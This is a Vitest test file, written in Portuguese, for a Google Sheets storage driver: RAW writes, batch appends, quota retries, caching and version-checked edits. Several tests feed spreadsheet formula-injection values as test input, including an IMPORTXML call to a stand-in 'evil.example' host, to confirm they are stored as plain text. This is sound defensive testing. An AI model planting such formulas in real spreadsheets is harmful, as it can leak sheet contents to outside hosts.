import { beforeEach, describe, expect, it, vi } from "vitest";
import { cacheMemoria, TTL_SEGUNDOS } from "@/lib/core/sheets/cache";
import { comRetryCota, ErroCota } from "@/lib/core/sheets/driver";
import { criarContexto } from "@/lib/core/contexto";
import { criarMundo } from "./helpers/mundo";

/* ------------------------------ driver real: RAW ------------------------------ */
const chamadasGoogle: Array<{ metodo: string; params: Record<string, unknown> }> = [];
vi.mock("@googleapis/sheets", () => {
  const reg = (metodo: string) => async (params: Record<string, unknown>) => {
    chamadasGoogle.push({ metodo, params });
    return { data: { valueRanges: [], values: [] } };
  };
  return {
    sheets: () => ({
      spreadsheets: {
        get: async (params: Record<string, unknown>) => {
          chamadasGoogle.push({ metodo: "spreadsheets.get", params });
          return { data: { sheets: ["Vendas", "VendaItens", "Caixa"].map((title, i) => ({ properties: { sheetId: 100 + i, title } })) } };
        },
        batchUpdate: reg("batchUpdate"),
        values: { batchGet: reg("batchGet"), get: reg("get"), append: reg("append"), update: reg("update") },
      },
    }),
  };
});
vi.mock("google-auth-library", () => ({ GoogleAuth: class {} }));

describe("driver do Google", () => {
  beforeEach(() => {
    chamadasGoogle.length = 0;
    process.env.GOOGLE_SERVICE_ACCOUNT_B64 = Buffer.from(JSON.stringify({ client_email: "x@y", private_key: "k" })).toString("base64");
  });

  it("grava SEMPRE com valueInputOption=RAW: =IMPORTXML(...) vira texto, nunca fórmula", async () => {
    const { driverGoogle } = await import("@/lib/core/sheets/google");
    const malicioso = '=IMPORTXML("https://evil.example","//a")';
    await driverGoogle.append("planilha-xyz-0001", "Clientes", [[malicioso, "+cmd", "-1", "@SUM(A1)"]]);
    await driverGoogle.updateRow("planilha-xyz-0001", "Clientes", 5, [malicioso]);
    const escritas = chamadasGoogle.filter((c) => c.metodo === "append" || c.metodo === "update");
    expect(escritas).toHaveLength(2);
    for (const e of escritas) expect(e.params.valueInputOption).toBe("RAW");
    // o texto chega intacto ao Google (RAW o guarda como texto)
    expect((escritas[0]!.params.requestBody as { values: string[][] }).values[0]![0]).toBe(malicioso);
  });

  it("o lote atômico vai em UMA requisição, grava só texto (stringValue) e nunca fórmula", async () => {
    const { driverGoogle } = await import("@/lib/core/sheets/google");
    const malicioso = '=IMPORTXML("https://evil.example","//a")';
    await driverGoogle.appendMultiplo("planilha-xyz-0001", [
      { aba: "Vendas", linhas: [["v1", malicioso, ""]] },
      { aba: "Caixa", linhas: [["c1", "+cmd", "@x"], ["c2", "-1", "7"]] },
    ]);
    const lotes = chamadasGoogle.filter((c) => c.metodo === "batchUpdate");
    expect(lotes).toHaveLength(1); // atômico e uma só requisição na cota
    const pedido = JSON.stringify(lotes[0]!.params.requestBody);
    expect(pedido).not.toContain("formulaValue");
    expect(pedido).toContain("stringValue");
    expect(pedido).toContain(malicioso.replace(/"/g, '\\"'));
    const reqs = (lotes[0]!.params.requestBody as { requests: Array<{ appendCells: { sheetId: number; rows: unknown[] } }> }).requests;
    expect(reqs.map((r) => r.appendCells.sheetId)).toEqual([100, 102]); // Vendas e Caixa
    expect(reqs[1]!.appendCells.rows).toHaveLength(2);
  });

  it("aba que não existe na planilha derruba o lote inteiro antes de enviar", async () => {
    const { driverGoogle } = await import("@/lib/core/sheets/google");
    chamadasGoogle.length = 0;
    await expect(
      driverGoogle.appendMultiplo("planilha-xyz-0001", [{ aba: "Vendas", linhas: [["a"]] }, { aba: "Inexistente", linhas: [["b"]] }]),
    ).rejects.toThrow();
    expect(chamadasGoogle.some((c) => c.metodo === "batchUpdate")).toBe(false);
  });

  it("usa escopo mínimo e só lê/escreve pelo servidor (módulo marcado server-only)", async () => {
    const { readFileSync } = await import("node:fs");
    const fonte = readFileSync("lib/core/sheets/google.ts", "utf8");
    expect(fonte).toContain('import "server-only"');
    expect(fonte).toContain("https://www.googleapis.com/auth/spreadsheets");
  });
});

describe("texto que parece fórmula no fluxo completo", () => {
  it("cadastrar um cliente chamado =IMPORTXML(...) guarda e devolve como texto", async () => {
    const { deps } = criarMundo();
    const d = await criarContexto(deps, "dona.a@exemplo.com");
    const nome = '=IMPORTXML("https://evil.example","//a")';
    const c = await d.acrescentar("Clientes", { nome, limiteCrediarioCentavos: 0, consentimentoEm: "2026-01-01" });
    expect(c.nome).toBe(nome);
  });
});

/* ------------------------------ cota 429 ------------------------------ */
describe("erro 429 (cota)", () => {
  it("espera exponencial e tenta de novo até dar certo", async () => {
    const esperas: number[] = [];
    let n = 0;
    const r = await comRetryCota(
      async () => {
        if (++n < 3) throw new ErroCota();
        return "ok";
      },
      { baseMs: 100, sleep: async (ms) => void esperas.push(ms) },
    );
    expect(r).toBe("ok");
    expect(esperas).toHaveLength(2);
    expect(esperas[1]!).toBeGreaterThan(esperas[0]!);
  });

  it("desiste depois das tentativas e não repete erros que não são de cota", async () => {
    await expect(comRetryCota(async () => { throw new ErroCota(); }, { tentativas: 3, sleep: async () => {} })).rejects.toBeInstanceOf(ErroCota);
    let chamadas = 0;
    await expect(comRetryCota(async () => { chamadas++; throw new Error("outro"); }, { sleep: async () => {} })).rejects.toThrow("outro");
    expect(chamadas).toBe(1);
  });
});

/* ------------------------------ cache 30 s ------------------------------ */
describe("cache de leitura", () => {
  it("vale por 30 s e expira depois", async () => {
    let agora = 0;
    const cache = cacheMemoria(() => agora);
    let leituras = 0;
    const ler = () => cache.obter("T1", "aba:Produtos", async () => ++leituras);
    expect(await ler()).toBe(1);
    agora = (TTL_SEGUNDOS - 1) * 1000;
    expect(await ler()).toBe(1);
    agora = (TTL_SEGUNDOS + 1) * 1000;
    expect(await ler()).toBe(2);
  });

  it("escrita invalida o cache só da própria loja", async () => {
    const cache = cacheMemoria();
    let a = 0;
    let b = 0;
    await cache.obter("A", "x", async () => ++a);
    await cache.obter("B", "x", async () => ++b);
    cache.invalidar("A");
    await cache.obter("A", "x", async () => ++a);
    await cache.obter("B", "x", async () => ++b);
    expect([a, b]).toEqual([2, 1]);
  });

  it("depois de gravar, a próxima leitura já vê o registro novo", async () => {
    const { deps } = criarMundo();
    const d = await criarContexto(deps, "dona.a@exemplo.com");
    expect(await d.ler("Clientes")).toHaveLength(0);
    await d.acrescentar("Clientes", { nome: "Ana", limiteCrediarioCentavos: 0, consentimentoEm: "2026-01-01" });
    expect(await d.ler("Clientes")).toHaveLength(1);
  });
});

/* ------------------------------ versão (edição de cadastro) ------------------------------ */
describe("edição com conferência de versão", () => {
  it("incrementa a versão e guarda a alteração", async () => {
    const { deps } = criarMundo();
    const d = await criarContexto(deps, "dona.a@exemplo.com");
    const novo = await d.atualizar("Produtos", "P-A-1", () => ({ precoCentavos: 6990 }));
    expect(novo.versao).toBe(2);
    expect(novo.precoCentavos).toBe(6990);
  });

  it("se outra pessoa gravou no meio, tenta de novo (até 3) e dá certo", async () => {
    const { deps, driver } = criarMundo();
    const d = await criarContexto(deps, "dona.a@exemplo.com");
    let interferencias = 0;
    driver.antesDeLerLinha = (planilha, aba, numero) => {
      if (interferencias++ < 2) driver.planilhas.get(planilha)!.get(aba)![numero - 1]![1] = String(10 + interferencias); // versão mudou
    };
    // 1ª e 2ª tentativas perdem a corrida (versão vai a 11 e depois 12); a 3ª lê 12, confere e grava 13.
    const r = await d.atualizar("Produtos", "P-A-1", () => ({ nome: "Camiseta A2" }));
    expect(r.nome).toBe("Camiseta A2");
    expect(r.versao).toBe(13);
    expect(driver.chamadas.filter((c) => c.tipo === "updateRow")).toHaveLength(1);
  });

  it("se a conferência falha nas 3 tentativas, devolve conflito e não grava", async () => {
    const { deps, driver } = criarMundo();
    const d = await criarContexto(deps, "dona.a@exemplo.com");
    let n = 0;
    driver.antesDeLerLinha = (planilha, aba, numero) => {
      driver.planilhas.get(planilha)!.get(aba)![numero - 1]![1] = String(100 + ++n);
    };
    await expect(d.atualizar("Produtos", "P-A-1", () => ({ nome: "Perdida" }))).rejects.toMatchObject({ codigo: "conflito" });
    expect(driver.chamadas.filter((c) => c.tipo === "updateRow")).toHaveLength(0);
  });

  it("exclusão é lógica: a linha continua na planilha com removidoEm", async () => {
    const { deps, driver } = criarMundo();
    const d = await criarContexto(deps, "dona.a@exemplo.com");
    await d.remover("Produtos", "P-A-1");
    expect(await d.ler("Produtos")).toHaveLength(0);
    expect(await d.ler("Produtos", { incluirRemovidos: true })).toHaveLength(1);
    expect(driver.planilhas.get("planilha-loja-A-0001")!.get("Produtos")).toHaveLength(2); // cabeçalho + linha
  });
});
